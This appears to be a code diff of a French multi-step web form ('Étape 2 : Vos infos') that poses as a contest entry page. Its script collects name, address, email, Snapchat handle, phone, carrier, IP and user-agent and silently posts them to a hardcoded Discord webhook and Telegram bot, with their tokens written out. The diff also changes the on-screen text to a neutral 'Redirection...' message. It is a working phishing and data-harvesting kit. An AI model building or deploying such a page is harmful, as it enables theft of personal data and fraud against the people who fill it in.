@@ -1,162 +1,169 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><meta charset="UTF-8"><title>Formulaire</title>
-<style>
-  body {
-    background: #2c014d;
-    color: #fff;
-    font-family: sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .c {
-    background: rgba(44,1,77,0.85);
-    padding: 30px;
-    border-radius: 20px;
-    width: 360px;
-    text-align: center;
-    box-shadow: 0 0 15px #9b00ff;
-    border: 2px solid #a54ffb;
-  }
-  input, button {
-    width: 100%;
-    margin: 8px 0;
-    padding: 12px;
-    border: 2px solid #a54ffb;
-    border-radius: 10px;
-    background: transparent;
-    color: white;
-    font-size: 16px;
-    outline: none;
-    box-shadow: inset 0 0 8px #9b00ff;
-    transition: 0.3s;
-  }
-  input:focus {
-    border-color: #f7b500;
-    box-shadow: 0 0 10px #f7b500;
-  }
-  button {
-    background: #f7b500;
-    color: #2c014d;
-    font-weight: bold;
-    cursor: pointer;
-    box-shadow: 0 0 10px #f7b500;
-    transition: 0.3s;
-  }
-  button:hover {
-    background: #e0a600;
-    box-shadow: 0 0 20px #ffcb3c;
-  }
-  #msg {
-    color: #f88;
-    margin-top: 15px;
-  }
-</style>
+<head>
+  <meta charset="UTF-8">
+  <title>Formulaire</title>
+  <style>
+    body {
+      background: #2c014d;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .c {
+      background: rgba(44,1,77,0.85);
+      padding: 30px;
+      border-radius: 20px;
+      width: 360px;
+      text-align: center;
+      box-shadow: 0 0 15px #9b00ff;
+      border: 2px solid #a54ffb;
+    }
+    input, button {
+      width: 100%;
+      margin: 8px 0;
+      padding: 12px;
+      border: 2px solid #a54ffb;
+      border-radius: 10px;
+      background: transparent;
+      color: white;
+      font-size: 16px;
+      outline: none;
+      box-shadow: inset 0 0 8px #9b00ff;
+      transition: 0.3s;
+    }
+    input:focus {
+      border-color: #f7b500;
+      box-shadow: 0 0 10px #f7b500;
+    }
+    button {
+      background: #f7b500;
+      color: #2c014d;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #f7b500;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #e0a600;
+      box-shadow: 0 0 20px #ffcb3c;
+    }
+    #msg {
+      color: #f88;
+      margin-top: 15px;
+    }
+  </style>
 </head>
 <body>
-<div class="c">
-  <h1>Étape 2 : Vos infos</h1>
-  <form id="form2">
-    <input name="nom" placeholder="Nom" required>
-    <input name="prenom" placeholder="Prénom" required>
-    <input name="email" type="email" placeholder="Email" required>
-    <input name="ville" placeholder="Ville" required>
-    <input name="codePostal" placeholder="Code Postal" required>
-    <input name="adresse" placeholder="Adresse (facultatif)">
-    <input name="snap" placeholder="Nom Snapchat" required>
-    <button type="submit">Valider</button>
-  </form>
-  <div id="msg"></div>
-</div>
+  <div class="c">
+    <h1>Étape 2 : Vos infos</h1>
+    <form id="form2">
+      <input name="nom" placeholder="Nom" required>
+      <input name="prenom" placeholder="Prénom" required>
+      <input name="email" type="email" placeholder="Email" required>
+      <input name="ville" placeholder="Ville" required>
+      <input name="codePostal" placeholder="Code Postal" required>
+      <input name="adresse" placeholder="Adresse (facultatif)">
+      <input name="snap" placeholder="Nom Snapchat" required>
+      <button type="submit">Valider</button>
+    </form>
+    <div id="msg"></div>
+  </div>
 
-<script>
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
-  const TELEGRAM_CHAT_ID = "-1002810249796";
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+    const TELEGRAM_CHAT_ID = "-1002810249796";
 
-  async function sendDiscord(embed) {
-    return fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
+    async function sendDiscord(embed) {
+      return fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    }
+
+    async function sendTelegram(text) {
+      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        })
+      });
+    }
+
+    document.getElementById('form2').addEventListener('submit', async e => {
+      e.preventDefault();
+      document.getElementById('msg').textContent = "Redirection...";
+
+      const step1 = JSON.parse(localStorage.getItem('step1') || '{}');
+      const d = new FormData(e.target);
+      const step2 = {
+        nom: d.get('nom'),
+        prenom: d.get('prenom'),
+        email: d.get('email'),
+        ville: d.get('ville'),
+        codePostal: d.get('codePostal'),
+        adresse: d.get('adresse'),
+        snap: d.get('snap')
+      };
+
+      const ip = step1.ip || "IP inconnue";
+      const ua = step1.ua || "Inconnu";
+
+      const discordEmbed = {
+        title: "[🎲] INFOS PARTICIPANT [🎲]",
+        color: 0x9B00FF,
+        fields: [
+          { name: "🚀 Nom", value: step2.nom, inline: true },
+          { name: "🚀 Prénom", value: step2.prenom, inline: true },
+          { name: "🚀 Opérateur", value: step1.operateur || "Non fourni", inline: true },
+          { name: "🚀 Téléphone", value: step1.telephone || "Non fourni", inline: true },
+          { name: "🚀 Adresse", value: step2.adresse || "Non fournie", inline: false },
+          { name: "🚀 Ville", value: step2.ville, inline: true },
+          { name: "🚀 Code Postal", value: step2.codePostal, inline: true },
+          { name: "🚀 E‑Mail", value: step2.email, inline: true },
+          { name: "🚀 Snapchat", value: step2.snap, inline: true },
+          {
+            name: "🌐 TIERS",
+            value:
+              `[🌐] TIERS [🌐]\n` +
+              `🌐 Adresse IP : ${ip}\n` +
+              `🌐 User-Agent : ${ua}`,
+            inline: false
+          }
+        ],
+        timestamp: new Date().toISOString()
+      };
+
+      const telegramText =
+        `[🎲] INFOS [🎲]\n\n` +
+        `🚀 Nom : ${step2.nom}\n` +
+        `🚀 Prénom : ${step2.prenom}\n` +
+        `🚀 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
+        `🚀 Téléphone : ${step1.telephone || 'Non fourni'}\n` +
+        `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
+        `🚀 Ville : ${step2.ville}\n` +
+        `🚀 Code Postal : ${step2.codePostal}\n` +
+        `🚀 E‑Mail : ${step2.email}\n` +
+        `🚀 Snapchat : ${step2.snap}\n\n` +
+        `[🌐] TIERS [🌐]\n` +
+        `🌐 Adresse IP : ${ip}\n` +
+        `🌐 User-Agent : ${ua}`;
+
+      await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
+
+      localStorage.setItem('step2', JSON.stringify(step2));
+      setTimeout(() => window.location = 'merci.html', 1000);
     });
-  }
-
-  async function sendTelegram(text) {
-    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text,
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      })
-    });
-  }
-
-  document.getElementById('form2').addEventListener('submit', async e => {
-    e.preventDefault();
-    document.getElementById('msg').textContent = "Envoi en cours...";
-    
-    const step1 = JSON.parse(localStorage.getItem('step1') || '{}');
-    const d = new FormData(e.target);
-    const step2 = {
-      nom: d.get('nom'),
-      prenom: d.get('prenom'),
-      email: d.get('email'),
-      ville: d.get('ville'),
-      codePostal: d.get('codePostal'),
-      adresse: d.get('adresse'),
-      snap: d.get('snap')
-    };
-
-    const ip = step1.ip || "IP inconnue";
-    const ua = step1.ua || "Inconnu";
-
-    const discordEmbed = {
-      title: "[🎲] INFOS PARTICIPANT [🎲]",
-      color: 0x9B00FF,
-      fields: [
-        { name: "🚀 Nom", value: step2.nom, inline: true },
-        { name: "🚀 Prénom", value: step2.prenom, inline: true },
-        { name: "🚀 Opérateur", value: step1.operateur || "Non fourni", inline: true },
-        { name: "🚀 Téléphone", value: step1.telephone || "Non fourni", inline: true },
-        { name: "🚀 Adresse", value: step2.adresse || "Non fournie", inline: false },
-        { name: "🚀 Ville", value: step2.ville, inline: true },
-        { name: "🚀 Code Postal", value: step2.codePostal, inline: true },
-        { name: "🚀 E‑Mail", value: step2.email, inline: true },
-        { name: "🚀 Snapchat", value: step2.snap, inline: true },
-        { name: "🌐 Adresse IP", value: ip, inline: false },
-        { name: "🌐 User-Agent", value: ua, inline: false }
-      ],
-      timestamp: new Date().toISOString()
-    };
-
-    const telegramText =
-      `[🎲] INFOS [🎲]\n\n` +
-      `🚀 Nom : ${step2.nom}\n` +
-      `🚀 Prénom : ${step2.prenom}\n` +
-      `🚀 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
-      `🚀 Téléphone : ${step1.telephone || 'Non fourni'}\n` +
-      `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
-      `🚀 Ville : ${step2.ville}\n` +
-      `🚀 Code Postal : ${step2.codePostal}\n` +
-      `🚀 E‑Mail : ${step2.email}\n` +
-      `🚀 Snapchat : ${step2.snap}\n\n` +
-      `[🌐] TIERS [🌐]\n` +
-      `🌐 Adresse IP : ${ip}\n` +
-      `🌐 User-Agent : ${ua}`;
-
-    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
-    
-    localStorage.setItem('step2', JSON.stringify(step2));
-    document.getElementById('msg').textContent = "Envoyé ! Redirection...";
-    setTimeout(() => window.location = 'merci.html', 1000);
-  });
-</script>
+  </script>
 </body>
 </html>
